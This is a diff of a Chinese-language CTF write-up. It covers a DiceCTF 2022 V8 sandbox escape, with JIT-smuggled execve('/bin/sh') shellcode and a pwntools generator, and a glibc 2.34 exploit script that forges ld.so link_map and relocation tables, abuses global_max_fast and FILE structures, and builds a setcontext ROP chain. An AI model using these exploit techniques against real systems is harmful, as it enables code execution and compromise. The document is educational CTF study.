@@ -560,6 +560,7 @@ payload = nop + shellcode + jmp; // 0xc0
 final exploit：
 
 ```js
+// dice{h0p-rop-pop-y0ur-w@y-out-of-the-sandb0x}
 // Utility function
 // ref from: https://github.com/Kyle-Kyle/blog/blob/master/writeups/dice22_memory_hole/pwn.js
 let hex = (val) => '0x' + val.toString(16);
@@ -711,17 +712,136 @@ for (let i = 168n, j = 0; i < 192n; i++, j++)
 aar(0n);
 ```
 
+---
 
 
 
+另一個作法則是，當透過 `%DebugPrint()` 去看某個 function object 的 attribute 時，會發現：
+
+```
+DebugPrint: 0x326208048835: [Function]
+ ...
+ - prototype: 0x3262081c31b1 <JSFunction (sfi = 0x326208146291)>
+ ...
+ - context: 0x3262081d293d <ScriptContext[5]>
+ - code: 0x326200004f01 <Code BUILTIN CompileLazy>
+```
+
+有一個 `code` member，此時在用 `%DebugPrintPtr()` 將印處此 member 的相關訊息，能得到：
+
+```
+%DebugPrintPtr(0x326200004f01)
+DebugPrint: 0x326200004f01: [Code]
+ - map: 0x32620800263d <Map>
+ - code_data_container: 0x3262080035c1 <Other heap object (CODE_DATA_CONTAINER_TYPE)>
+ - builtin_id: CompileLazy
+kind = BUILTIN
+name = CompileLazy
+compiler = turbofan
+address = 0x326200004f01
+
+Trampoline (size = 16)
+0x326200004f40     0  49bac0d6e80762320000 REX.W movq r10,0x326207e8d6c0  (CompileLazy)
+0x326200004f4a     a  41ffe2               jmp r10
+0x326200004f4d     d  cc                   int3l
+0x326200004f4e     e  cc                   int3l
+0x326200004f4f     f  cc                   int3l
+
+Instructions (size = 1112)
+0x326207e8d6c0     0  55                   push rbp
+0x326207e8d6c1     1  4889e5               REX.W movq rbp,rsp
+0x326207e8d6c4     4  6a1e                 push 0x1e
+0x326207e8d6c6     6  4883ec20             REX.W subq rsp,0x20
+...
+```
+
+由此可知 Code object 紀錄 function 實際要執行的 instruction 的相關訊息，而如果將 `JSFunction` 的 code object pointer 改成 `0x414141` (與 base address 的 offset)，在呼叫 function 時會 trigger segmentation fault：
+
+```
+0xdea07e8206b    test   dword ptr [rcx + 0x1b], 0x20000000
+0xdea07e82072    jne    0xdea07e82081                 <0xdea07e82081>
+
+0xdea07e82078    add    rcx, 0x3f
+0xdea07e8207c    jmp    0xdea07e8208c                 <0xdea07e8208c>
+↓
+0xdea07e8208c    jmp    rcx
+```
+
+觀察 asm 可以發現在後來會跳到 rcx+0x3f 上面去執行，然而 rcx 的 value 會是 `0xdea00414141`，也就是 code object 的位址，至此我們已經知道如果蓋寫 `JSFunction` 的成員 `code`，就可以控制程式的執行流程了。
+
+透過 Turbofan JITer 產生的 instruction 會長得像：
+
+```
+pwndbg> x/5i 0xf63000440b2
+   0xf63000440b2:       movabs r10,0x9090582f62696e
+   0xf63000440bc:       vmovq  xmm0,r10
+   0xf63000440c1:       vmovsd QWORD PTR [rcx+0xf],xmm0
+   0xf63000440c6:       movabs r10,0x90905a2f736800
+   0xf63000440d0:       vmovq  xmm0,r10
+pwndbg> x/5i 0xf63000440b3
+   0xf63000440b3:       mov    edx,0x2f62696e
+   0xf63000440b8:       pop    rax
+   0xf63000440b9:       nop
+   0xf63000440ba:       nop
+   0xf63000440bb:       add    ah,al
+pwndbg> x/5i 0xf63000440c7
+   0xf63000440c7:       mov    edx,0x2f736800
+   0xf63000440cc:       pop    rdx
+   0xf63000440cd:       nop
+   0xf63000440ce:       nop
+   0xf63000440cf:       add    ah,al
+```
+
+- `0xf63000440b3 ` 與 `0xf63000440c7` 原本為 double value，不過在偏移後也被視為 instruction 的開頭，因此我們可以構造出任意的 shellcode
+  - 最後要執行的 instruction 必須為 jmp (2 bytes)，因此一組 instructions 最多只能到 6 bytes
+- `%OptimizeFunctionOnNextCall()` 可以幫助我們讓 function 更快被 JIT；而在執行此 function 前需要執行 `%PrepareFunctionForOptimization()` 來準備 function 的 FeedbackVector
+
+
+
+之後只要透過 aaw 蓋掉 `JSFunction` code 使其執行到我們構造的 shellcode chain 即可，附上產生 shellcode 的腳本，實際 exploit 參考 [Mem2019 的 github](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/memory-hole-1984.js)：
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context.arch = 'amd64'
+
+binsh1 = 0x0068732f
+binsh2 = 0x6e69622f
+
+shellcodes = [
+    f"push {binsh1} ; pop rax",
+    f"push {binsh2} ; pop rdx",
+    "shl rax, 0x20 ; xor esi, esi",
+    "add rax, rdx ; xor edx, edx ; push rax",
+]
+jmp = asm("jmp .+14")
+final = asm("mov rdi, rsp ; push 0x59 ; pop rax ; syscall")
+
+for sc in shellcodes:
+    sc_asm = asm(sc)
+    assert(len(sc_asm) <= 6)
+    sc_asm = sc_asm.ljust(6, b'\x90') + jmp
+    print(hex(u64(sc_asm))[2:])
+print(hex(u64(final))[2:])
+
+# https://www.binaryconvert.com/convert_double.html
+"""
+1.95538254221075331056310651818E-246
+1.95606125582421466942709801013E-246
+1.99957147195425773436923756715E-246
+1.95337673326740932133292175341E-246
+2.63489895655547273676039775372E-284
+"""
+```
 
 
 
 參考資料：
 
 - [[DiceCTF 2022] - memory hole](https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole)
-
-
+- [Dice CTF Memory Hole: Breaking V8 Heap Sandbox](https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html)
 
 
 
@@ -1024,7 +1144,7 @@ _dl_fixup (...)
 
 
 
-而在較新的 binary 會採取 versioning，指定從哪個 library 當中解析 function，相關資訊會存在於 `l->l_info[DT_VER]`，`DT_VER` 沒有 macro define 的 value，不過官方 writeup 上面寫的是 50。較舊的 binary 將其寫成 NULL，致使 symbol 的尋找範圍不限於某個 library 當中。
+而在較新的 binary 會採取 versioning，指定從哪個 library 當中解析 function，相關資訊會存在於 `l->l_info[DT_VER]`，較舊的 binary 將其寫成 NULL，致使 symbol 的尋找範圍不限於某個 library 當中。
 
 實際上 glibc versioning 與 [elf/dl-version](https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-version.c) 內的 function 相關，不過我不確定呼叫的時機點為何，但為了確保不影響執行結果，因此將 `l->l_info[DT_VER]` 寫成 NULL。關於 versioning 的詳細資訊可以參考[此篇文章](https://maskray.me/blog/2020-11-26-all-about-symbol-versioning#%E4%B8%AD%E6%96%87%E7%89%88)。
 
@@ -1067,7 +1187,7 @@ _dl_fixup()
 }
 ```
 
-`_dl_lookup_symbol_x()`
+`_dl_lookup_symbol_x()`：
 
 ```c
 // undef_name: symbol string, e.g. "write"
@@ -1189,7 +1309,7 @@ _dl_lookup_symbol_x(const char *undef_name,
 
 
 
-`_dl_fixup()`：
+`do_lookup_x()`：
 
 ```c
 // 實際 lookup function 的實作，如果找到 symbol 的位址，return value > 0；如果 == 0 代表沒找到；如果 < 0 代表出現錯誤
@@ -2043,18 +2163,19 @@ from pwn import *
 
 context.arch = 'amd64'
 context.terminal = ['tmux', 'splitw', '-h']
+SLEEP_TIME = 0.01
 
 r = process('./N', env={"LD_PRELOAD": "/usr/src/glibc/glibc_dbg_2.34/libc.so"}, aslr=False)
 e = ELF('./N')
-ld = ELF('/tmp/bin/ld.so')
+ld = ELF('/tmp/nightmare/ld.so')
 libc = ELF('/usr/src/glibc/glibc_dbg_2.34/libc.so')
 load_sym = "add-symbol-file /usr/src/glibc/glibc_dbg_2.34/libc.so 0x1555553446c0"
 
-# offset with chunk
-ld.address = 2412528
-libc.address = 274416
+# ld / libc 與跟一開始 mmap 出來的 "chunk" 的 offset
+ld.address = 0x24d000 - 0x10
+libc.address = 0x43000 - 0x10
 
-# definition: https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/elf.h#L852
+# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/elf/elf.h#L855
 d_tag = {
     'DT_PLTGOT' : 3,
     'DT_STRTAB' : 5,
@@ -2067,15 +2188,15 @@ d_tag = {
     'DT_VER' : 50,
 }
 l_info_noaslr = {
-    0x555555557ec8, # 3
-    0x555555557e78, # 5
-    0x555555557e88, # 6
-    0x555555557e18, # 13
-    0x555555557eb8, # 21
-    0x555555557ef8, # 23
-    0x555555557e48, # 26
-    0x555555557e58, # 28
-    0x555555557e68, # 50
+    0x555555557ec8, # 3 (DT_PLTGOT)
+    0x555555557e78, # 5 (DT_STRTAB)
+    0x555555557e88, # 6 (DT_SYMTAB)
+    0x555555557e18, # 13 (DT_FINI)
+    0x555555557eb8, # 21 (DT_DEBUG)
+    0x555555557ef8, # 23 (DT_JMPREL)
+    0x555555557e48, # 26 (DT_FINI_ARRAY)
+    0x555555557e58, # 28 (DT_FINI_ARRAYSZ)
+    0x555555557e68, # 50 (DT_VER)
 }
 l_info_last_byte = {
     'DT_PLTGOT': 0xc8, # 3
@@ -2091,17 +2212,8 @@ l_info_last_byte = {
 ld_l_info_last_byte = {
     'DT_PLTGOT': 0xe0, # 3
 }
-info("""
-# Executable
-DT_STRTAB: 0x555555554500
-DT_SYMTAB: 0x5555555543e0
-binary link_map: p (*(struct link_map *) 0x155555555220)
-# ld
-DT_STRTAB: 0x1555555227b0
-DT_SYMTAB: 0x1555555224b0
-ld link_map: p (*(struct link_map*) 0x155555554a48)
-""")
 
+# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/libio/bits/types/struct_FILE.h#L49
 class io_obj:
     def __init__(self, offset):
         self.offset = offset
@@ -2112,6 +2224,7 @@ class io_obj:
     def _IO_save_end(self):
         return self.offset + 0x58
 
+# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/sysdeps/generic/ldsodefs.h#L307
 class rtld_global:
     def __init__(self, offset):
         self.offset = offset
@@ -2131,6 +2244,7 @@ class rtld_global:
     def _dl_rtld_map(self):
         return self.offset + 0xA08
 
+# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/include/link.h#L95
 class link_map:
     def __init__(self, offset):
         self.offset = offset
@@ -2149,116 +2263,164 @@ class link_map:
 
 def write(off, bz):
     for i, b in enumerate(bz):
-        sleep(0.01)
+        sleep( SLEEP_TIME )
         r.send(p64(off + i, signed=True))
-        sleep(0.01)
+        sleep( SLEEP_TIME )
         r.send(p8(b))
-        #r.recvuntil('POINTERS')
 
-binary_map = link_map(209440) # offset between binary link_map and ld base
-ld_map = link_map(207432) # offset between ld.so link_map and ld base
-_rtld_global = rtld_global(ld.symbols["_rtld_global"]) # defines all variables global to ld.so
-
+# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/elf/elf.h#L663
 def elf64_rela(r_offset, r_info, r_addend):
     return p64(r_offset) + p64(r_info) + p64(r_addend, signed=True)
+# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/elf/elf.h#L527
 def elf64_sym(st_name, st_info, st_other, st_shndx, st_value, st_size):
     return p32(st_name) + p8(st_info) + p8(st_other) + p16(st_shndx) + p64(st_value) + p64(st_size)
 
 elf64_rela_size = len(elf64_rela(0,0,0))
 elf64_sym_size = len(elf64_sym(0,0,0,0,0,0))
-info(f"struct rela size: {hex(elf64_rela_size)}")
-info(f"struct sym size: {hex(elf64_sym_size)}")
 
-# tech: use l_info[DT_DEBUG] to forge relocation table
+# ld base 與 executable 的 link_map 的 offset
+binary_map = link_map(0x33220)
+# ld base 與 ld 的 link_map 的 offset 
+ld_map = link_map(0x32a48)
+# _rtld_global 存放 ld 的 global data
+_rtld_global = rtld_global(ld.symbols["_rtld_global"])
+
+
+info(f"""\
+# STEP.0
+## Executable
+DT_STRTAB:            0x555555554500
+DT_SYMTAB:            0x5555555543e0
+binary link_map:      p (*(struct link_map *) 0x155555555220)
+
+## ld
+DT_STRTAB:            0x1555555227b0
+DT_SYMTAB:            0x1555555224b0
+ld link_map:          p (*(struct link_map *) 0x155555554a48)
+
+## other
+struct rela size:     {hex(elf64_rela_size)}
+struct sym size:      {hex(elf64_sym_size)}
+show heapinfo:        heapinfo 0x15555550ac60
+
+# STEP.4
+fake_linkmap addr:    p (*(struct link_map *) 0x1555555549c8)
+fake_io addr:         p (*(struct _IO_FILE *) 0x1555555549c8)
+
+# STEP.5
+main_arena:           p (*(struct malloc_state *) 0x15555550ac60)
+global_max_fast:      x/gx 0x1555555121c0
+__open_memstream():   p *(struct _IO_FILE_memstream *) 0x155555241010
+""")
+
+########### STEP 1. 將 write 解析到 _Exit@got 達到不限次數限制的寫 ###########
+gotoff__Exit_write = e.got["_Exit"] - e.got["write"]
+write(binary_map.l_addr(), p8(gotoff__Exit_write))
+
+
+
+########### STEP 2. 清除版本資訊避免影響結果以及恢復 write function 的解析 ###########
+# 透過竄改 last byte，讓 DT_JMPREL (Relocation table) / DT_SYMTAB (Symbol table) 指向 DT_DEBUG (_r_debug)
+# 這樣就能構造出假的 Elf64_Rela entry 以及 Elf64_Sym entry
 def set_rela_table(table):
     write(ld.symbols["_r_debug"], table)
     write(binary_map.l_info(d_tag['DT_JMPREL']), p8(l_info_last_byte['DT_DEBUG']))
 
-# tech: use l_info[DT_DEBUG] to forge symbol table
-# we choose l->l_info[DT_STRSZ] (10) to write our symbol, and its symbol index is 8
-fake_sym_idx = 2
-def set_sym_table(table):
-    write(ld.symbols["_r_debug"] + elf64_sym_size * fake_sym_idx, table)
-    write(binary_map.l_info(d_tag['DT_SYMTAB']), p8(l_info_last_byte['DT_DEBUG']))
-
 def restore_rela_table():
     write(binary_map.l_info(d_tag['DT_JMPREL']), p8(l_info_last_byte['DT_JMPREL']))
+
+write_sym_idx = 2
+def set_sym_table(table):
+    write(ld.symbols["_r_debug"] + elf64_sym_size * write_sym_idx, table)
+    write(binary_map.l_info(d_tag['DT_SYMTAB']), p8(l_info_last_byte['DT_DEBUG']))
 
 def restore_sym_table():
     write(binary_map.l_info(d_tag['DT_SYMTAB']), p8(l_info_last_byte['DT_SYMTAB']))
 
-#### STEP 1. resolve write to _Exit@got and then infinitely write
-gotoff__Exit_write = e.got["_Exit"] - e.got["write"]
-write(binary_map.l_addr(), p8(gotoff__Exit_write))
-
-#### STEP 2. clear version info and write code base
-## because write@got is still not resolved, we will call _dl_fixup in each loop iteration
-set_rela_table(elf64_rela(0x4100, 0x200000007, 0)) 
-# resolve write address to l->l_addr + 0x4100 == 0x555555558128
+# 原本 r_offset 從 0x4018 變成 0x4100，只是單純讓之後解析的位址不要寫到 write@GOT 即可，確保每次都能進入 _dl_fixup
+set_rela_table(elf64_rela(0x4100, 0x7 + (write_sym_idx << 32), 0))
+# 使得 _dl_fixup 解析到 st_info 為 1 的 symbol entry，並且 write@got 被寫入 _init function，而此 function 什麼事情都不會做
 set_sym_table(elf64_sym(0, 0x12, 1, 0, e.symbols['_init'] - gotoff__Exit_write, 0))
+# 清除 l->l_info[VERSYMIDX (DT_VERSYM)]
 write(binary_map.l_info(d_tag['DT_VER']), p64(0))
+# 先恢復 Symbol table 再恢復 Relocation table
 restore_sym_table()
 restore_rela_table()
 
-#### STEP 3. resolve function to _dl_fini of ld
-# disable destructors
-def disable_destructor():
-    write(binary_map.l_init_called(), p8(0))
-def enable_destructor():
+
+
+########### STEP 3. 解析 ld 的 _dl_fini function 並寫到 write@got ###########
+# 當 l_init_called 非為 0 時，_dl_fini 會去呼叫 fini function
+def enable_fini_function():
     write(binary_map.l_init_called(), p8(0xff))
-disable_destructor()
-_dl_x86_get_cpu_features_sym_idx = 8
+# 而當 l_init_called 為 0 時，_dl_fini 會以為 fini function 已經呼叫完
+def disable_fini_function():
+    write(binary_map.l_init_called(), p8(0))
+
+disable_fini_function()
+_dl_x86_get_cpu_features_sym_idx = 0x8
 _dl_x86_get_cpu_features_strtab_offset = 0x166
-# create fake sym entry, all field is same except st_value because we want to resolve _dl_fini function
+# 任意在 dl 當中選一個 function symbol "A" 並取得其 Elf64_Sym 的結構。而後我們在 DT_DEBUG 中建立假的 Symbol table entry，
+# 幾乎所有的欄位都與 "A" 的 Elf64_Sym 相同，但假的 "A" Elf64_Sym 的 st_value 需要是 _dl_fini 的 offset，
+# 這樣在 _dl_fixup 解析 "A" 後會把 _dl_fini 認為是 function 的位址而寫入 GOT 當中並執行
+# 在這個 exploit 當中 "A" 即是 function "_dl_x86_get_cpu_features"
+
+#### 構造假的 fake Elf64_Sym ####
+# ld 的 l_info[ DT_PLTGOT ] 與 _GLOBAL_OFFSET_TABLE_ 位址相同，因此我們先在 _GLOBAL_OFFSET_TABLE_ 建立假的 "A" Elf64_Sym
 write(ld.symbols["_GLOBAL_OFFSET_TABLE_"] + elf64_sym_size * _dl_x86_get_cpu_features_sym_idx,
-        elf64_sym(0x166, 18, 0, 13, ld.symbols["_dl_fini"] - ld.address, 12))
-# make ld's l_info[DT_SYMTAB] of point to l_info[DT_PLTGOT], the sym _dl_x86_get_cpu_features will point to our fake E2lf64_Sym
+        elf64_sym(0x166, 0x12, 0, 0xc, ld.symbols["_dl_fini"] - ld.address, 0xb))
+# 之後把 ld 的 l_info[ DT_SYMTAB ] 的最後一個 byte 改成 l_info[ DT_PLTGOT ]，這樣呼叫 "A" 時解析到的就會是我們構造的 "A" Elf64_Sym
 write(ld_map.l_info(d_tag['DT_SYMTAB']), p8(ld_l_info_last_byte['DT_PLTGOT']))
 
-# fake string table, make write function resolves the '_dl_x86_get_cpu_features' function
+#### 讓 write@plt 在透過 _dl_fixup 解析 function 時，誤以為 string entry 指向 "_dl_x86_get_cpu_features" ####
 write_strtab_offset = 0x4b
+# write 會從 Elf64_Sym 取出 string offset，並 string table 當中找到對應 offset 的 string，
+# 這次把 l_info[ DT_DEBUG ] 當做假的 string table，因此要在 write Elf64_Sym 所紀錄的 string offset
+# 寫入 "_dl_x86_get_cpu_features"，這樣 dl 就會以為 write function 的名字叫做 "_dl_x86_get_cpu_features"，
+# 藉此就會去解析看有哪個 object 裡面有 "_dl_x86_get_cpu_features" function，這時候就會找到 ld，
+# 而 ld 中紀錄 "_dl_x86_get_cpu_features" 對應到的 Symbol table entry 也被我們修改了，
+# 所以在解析完後，實際上回傳的並不是 _dl_x86_get_cpu_features 的位址，而是 _dl_fini
 write(ld.symbols["_r_debug"] + write_strtab_offset, b"_dl_x86_get_cpu_features")
+# 一將 l_info[ DT_DEBUG ] 視為 l_info[ DT_STRTAB ] 後，_exit@got 就會被解析成 _dl_fini
 write(binary_map.l_info(d_tag['DT_STRTAB']), p8(l_info_last_byte['DT_DEBUG']))
-# resolve to write@got (base + e.got["_Exit"] - e.got["write"] + e.got["write"] - e.got["_Exit"] + e.got["write"])
-set_rela_table(elf64_rela(e.got["write"] - gotoff__Exit_write, 0x200000007, 0))
-restore_rela_table()
-
-### STEP4. setup arbitrary call primitive
-## because _exit@got saves the _dl_fini address, we can restore l->l_addr
+# 因為此時 _exit@got 存放 _dl_fini，因此不再需要 l_addr 的 offset，恢復 l_addr 後 _dl_fini 就會被解析到 write@got
 write(binary_map.l_addr(), p8(0))
-# make l_info[DT_FINI] point to l_info[DT_DEBUG]
+
+
+
+########### STEP 4. 透過 _dl_fini 構造任意呼叫的 primitive ###########
+# 讓 l_info[ DT_FINI ] 指向 l_info[ DT_DEBUG ]
 write(binary_map.l_info(d_tag['DT_FINI']), p8(l_info_last_byte['DT_DEBUG']))
-# set l_info[DT_FINI_ARRAY] to null
+# 我們只想控制 DT_FINI function，因此將 l_info[ DT_FINI_ARRAY ] 清成 NULL
 write(binary_map.l_info(d_tag['DT_FINI_ARRAY']), p64(0))
-# set __rtld_mutex_unlock to invalid _kind, make sure the mutex will not affect us
+# 必須將 _rtld_global._dl_load_lock_._kind 設為 invalid type，這樣才不會因為 _dl_fini 的 mutex lock 處理讓程式 crash
 def make_mutex_invalid():
     write(_rtld_global._dl_load_lock__kind(), p8(0xff))
 make_mutex_invalid()
-# create fake link_map at _dl_load_lock
+# 在 _rtld_global._dl_load_lock_ 建立一個假的 link_map，因為我們只能透過 _dl_fini 的 fini function 來呼叫 function，
+# 而呼叫時 rdi 會指向 _rtld_global._dl_load_lock_，代表這塊記憶體區塊會同時為多個 struct，以供不同的 function call 傳遞參數
 fake_linkmap = link_map(_rtld_global._dl_load_lock() - ld.address)
-# create a _IO_FILE at _rtld_global._dl_load_lock, it can be the argument of function about FILE
 fake_io = io_obj(_rtld_global._dl_load_lock())
-info(f"fake_linkmap addr: p (*(struct link_map *) 0x1555555549c8), offset({fake_linkmap._base()})")
-info(f"fake_io addr: p (*(struct _IO_FILE*) 0x1555555549c8), offset({fake_linkmap._base()})")
 
-######## some primitive ########
-page_mem_alloc = 0 # global_max_fast ow implementation
 
-# rax: function address
-# rdi: _rtld_global._dl_load_lock (_rtld_local+2440)
-def call_func(func, arg=b""):
+
+########### STEP 5. 為假的 link_map 構造 symbol table ###########
+# 記錄我們總共透過 mmap 建立多少 memory
+page_mem_alloc = 0
+# rip: [_r_debug + 0]
+# rdi: _rtld_global._dl_load_lock
+def call_func(func, arg=b"", final=False):
     # control l_addr to point to function
     write(binary_map.l_addr(), p64(func - ld.symbols["_r_debug"], signed=True))
-    # control _dl_load_lock to the argument
     write(_rtld_global._dl_load_lock(), arg)
-    # set l_init_called --> call destructor --> fn(arg)
-    enable_destructor()
-    make_mutex_invalid()
+    enable_fini_function()
+    if not final:
+        make_mutex_invalid()
 
 def page_boundary(size):
     return (size + 0x1000) >> 12 << 12
 
-# _file._IO_buf_start will point to mmap chunk
+# _file._IO_buf_start 會指向 mmap 的 chunk address
 def malloc(size):
     assert size % 2 == 0
     old_size = int((size - 100) / 2)
@@ -2268,121 +2430,87 @@ def malloc(size):
     _file._IO_write_ptr = old_size + 1
     _file._IO_read_ptr = 0xFFFFFFFFFFFFFFFF
     _file._IO_read_end = 0xFFFFFFFFFFFFFFFF
-    # p *(struct _IO_FILE *) 0x1555555549c8
     call_func(libc.symbols["_IO_str_overflow"], bytes(_file)[:0x48])
     make_mutex_invalid()
 
+# 釋放 _file._IO_buf_start 指向的 chunk
 def free():
     call_func(libc.symbols["_IO_str_finish"])
   
 # global max fast
 def gmf_size(offset): 
-    # each fastbinY entry is 8 bytes, and it can record 0x10 bytes data
-    # get offset from fastbinY to target
+    # 取得寫入目標與 fastbinsY 的 offset
     off_bt_fastbinY_target = (offset - libc.symbols["main_arena"] - 0x10)
-    # each fastbin entry is 8 bytes
+    # 每個 fastbinsY entry 為 0x8 byte，紀錄一個 pointer
     needed_fastbin_entry = off_bt_fastbinY_target // 0x8
-    # size start from 0x20, we need more 2 entries
+    # fastbinsY 紀錄的大小從 0x20 開始 (e.g. 0x20, 0x30, ...)
     needed_fastbin_entry += 2
+    # fastbinsY 的每個 entry 都紀錄不同大小的 chunk，而 chunk 每 0x10 為一個單位
     return needed_fastbin_entry * 0x10
 
 meta_hdr_offset = 8
-# arg offset = mmap chunk ~ target
-# write a mmap ptr to [base + offset]
+# 在 offset 的地方寫入一個指向 mmap chunk 的 pointer
 def ptr_write(offset):
     global page_mem_alloc
     size = gmf_size(offset)
     write(offset, p64(0)) # clear data
     malloc(size)
-    # write global_max_fast (size_t) to a larege value
+    # 將 global_max_fast 寫成一個很大的值，代表所有大小的 chunk 都會進入 fastbin 當中
     write(libc.symbols["global_max_fast"], p64(0xFFFFFFFFFFFFFFFF))
-    # new mmap chunk will allocate before past mmap chunks
-    # so we need to calculate negative offset containing past mmap chunks
+    # 後續 mmap 出來的 chunk 會長在前一塊 mmap 出來的 chunk 前面，並且兩者相連
+    # 如果能知道 malloc 傳入的大小，就能得知這次 malloc 出來的 chunk 與一開始 mmap 出來的 "chunk" 的 offset 為何
     mmap_chunk = -page_boundary(size) - page_mem_alloc
     mmap_next_chunk = mmap_chunk + size
     write(mmap_chunk - meta_hdr_offset, p64(size | 1)) # set chunk prev_inuse bit
     write(mmap_next_chunk - meta_hdr_offset, p8(0x50)) # set fake chunk size
-    page_mem_alloc += page_boundary(size) # calc new inuse page size
-    # write fastbin addr to target (offset)
+    page_mem_alloc += page_boundary(size)
+    # mmap chunk 會被放到 fastbin 當中，而對應 fastbinsY entry 正好是距離 offset 的位址
     free()
-    # restore mutex
     make_mutex_invalid()
-    # restore global_max_fast
-    write(libc.symbols["global_max_fast"], p64(0x80))
-    return -page_mem_alloc # return the offset
+    write(libc.symbols["global_max_fast"], p64(0x80)) # 恢復 global_max_fast
+    # 回傳 mmap chunk 與 "chunk" 的 offset
+    return -page_mem_alloc
 
-#### STEP5. create symbol table
-info("main_arena: p (*(struct malloc_state *) 0x15555550ac60)")
-info("global_max_fast: x/10gx 0x1555555121c0")
-symtab_dyn = ptr_write(fake_linkmap.l_info(d_tag['DT_SYMTAB'])) # 6
-# make sure after swap, the __kind is still invalid
+# 為假 link_map 的 Symbol Section 建立一塊空間
+symtab_dyn = ptr_write(fake_linkmap.l_info(d_tag['DT_SYMTAB']))
+# 確保在 swap 後 _rtld_global._dl_load_lock_._kind 仍是 invalid
 write(fake_io._IO_save_end(), p8(0xff))
-# _IO_switch_to_backup_area() will switch read with save
+# _IO_read_end <--> _IO_save_end ; _IO_read_base <--> _IO_save_end ; _IO_read_ptr = 原先的 _IO_save_end
 call_func(libc.symbols["_IO_switch_to_backup_area"])
-# make size of chunk tcache so memstream takes from it
+# 將 chunk size 改成 0x200，並 set prev_inuse bit
 write(symtab_dyn - meta_hdr_offset, p64(0x200 | 1))
-# trick io into thinking we aren't actually swapped
+# 清除 FILE flags
 write(fake_io._flags(), p64(0))
-# _IO_free_backup_area() will free _IO_save_base, but this time the ptr will end up in tcache
+# free(_IO_save_base)，讓 chunk 再次被釋放，不過這次並非進入 fastbin 當中，而是進入 0x200 tcache bin
 call_func(libc.symbols["_IO_free_backup_area"])
-# get chunk from tcache and write ptrs into mmap
-info("p *(struct _IO_FILE_memstream *) 0x155555241000")
-info("p *(struct _IO_wide_data *) 0x155555241100")
+# 再次取得 chunk，並且在 chunk 中寫入 pointer，其中包含指向 chunk 的 pointer
 call_func(libc.symbols["__open_memstream"])
-### in here, fake_linkmap[DT_SYMTAB] points to chunk malloced in __open_memstream(), and this chunk is filled with
-# before: l_info[DT_SYMTAB] == fake_io->_fileno + fake_io->_flags2 << 32 == 0x155555241000
-# after: l_info[DT_SYMTAB] == 0x155555241090, the d_ptr will point to symtab_dyn + 0x110
-#        because the struct member "new_f->fp._sf._sbf._f._lock"
+# 讓 Symbol table 做偏移，使得 Elf64_Dyn.d_un.d_ptr 對應到指向 chunk 的 pointer
 write(fake_linkmap.l_info(d_tag['DT_SYMTAB']), p8(0x90))
-# symtab will be symtab_dyn + 0x110
+# 更新 Symbol table 的 offset
 symtab = symtab_dyn + 0x110
 
-#### STEP6. setup the fake link_map
-# build strtab and pltgot
-# mmap 0x1555551ad000
-strtab = ptr_write(fake_linkmap.l_info(d_tag['DT_STRTAB'])) # 5
-# mmap 0x155555119000
-pltgot = ptr_write(fake_linkmap.l_info(d_tag['DT_PLTGOT'])) # 3
-# before: l_info[DT_JMPREL] == 0x155555553f20 (overlap with ld_linkmap->l_info[DT_RELA]
-# after: l_info[DT_JMPREL] == 0x155555553ff8
-# _GLOBAL_OFFSET_TABLE_ == 0x155555554000
-# make l_info[DT_JMPREL] point to GOT - 8
-write(fake_linkmap.l_info(d_tag['DT_JMPREL']), p8(0xf8)) # 23
-# _GLOBAL_OFFSET_TABLE_ - 0x155555554000
-# _rtld_local - 0x155555554040
-# fake_linkmap - 0x1555555549c8
+
+
+########### STEP 6. 為假的 link_map 設置其他 table ###########
+strtab = ptr_write(fake_linkmap.l_info(d_tag['DT_STRTAB']))
+pltgot = ptr_write(fake_linkmap.l_info(d_tag['DT_PLTGOT']))
+write(fake_linkmap.l_info(d_tag['DT_JMPREL']), p8(0xf8))
 jmprel = ptr_write(ld.symbols["_GLOBAL_OFFSET_TABLE_"]) # d_ptr of DT_JMPREL
-# mmap 0x155554ff2000
-addr = ptr_write(fake_linkmap.l_addr())
+fake_linkmap_laddr = ptr_write(fake_linkmap.l_addr())
 
-"""
-Elf64_Rela
-{
-  r_offset = where - addr + 0x10,
-  r_info = 0x000000007,
-  r_addend = 0
-}
 
-Elf64_Sym
-{
-  st_name = 0,
-  st_info = 18 '\022',
-  st_other = 1 '\001',
-  st_shndx = 0,
-  st_value = what - addr + 0x10,
-  st_size = 0,
-}
-"""
+
+########### STEP7. 建構 stack pivoting + ORW 的 ROP chain ###########
 def rel_write(where, what):
-    write(jmprel + 0x8, elf64_rela(where - addr + 0x10, 0x000000007, 0))
-    write(symtab - 0x10, elf64_sym(0, 0x12, 1, 0, what - addr + 0x10, 0))
+    write(jmprel - 0x10 + 0x18, elf64_rela(where - fake_linkmap_laddr + 0x10, 0x000000007, 0))
+    write(symtab - 0x10, elf64_sym(0, 0x12, 1, 0, what - fake_linkmap_laddr + 0x10, 0))
     # rdi: fake_linkmap (l)
     # rsi: 1 (reloc_arg)
     call_func(ld.symbols["_dl_fixup"])
 
-#### STEP7. setup stack pivoting gadget
 # 0x146110 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
-rop_rbx_write_call = libc.address + 0x146110
+rop_rdi2rdx = libc.address + 0x146110
 rop_pop_rdi_ret = libc.address + 0x2daa2
 rop_pop_rsi_ret = libc.address + 0x37bca
 rop_pop_rdx_ret = libc.address + 0xde622
@@ -2390,11 +2518,11 @@ rop_pop_rax_ret = libc.address + 0x44710
 rop_syscall_ret = libc.address + 0x88406
 rop_read = libc.symbols["read"]
 rop_write = libc.symbols["write"]
-info(f"b *0x15555545e110")
-# make "mov rdx, qword ptr [rdi + 8]" get chunk address at rdx
+rop_exit = libc.symbols["_exit"]
+# 讓 [rdi + 8] 拿到 rdi 的位址，也就是 fake link_map
 rel_write(_rtld_global._dl_load_lock() + 8, 0)
-rel_write(0x20, libc.symbols["setcontext"] + 61) # first function
-rel_write(0xA0, 0x100) # new stack is chunk + 0x100
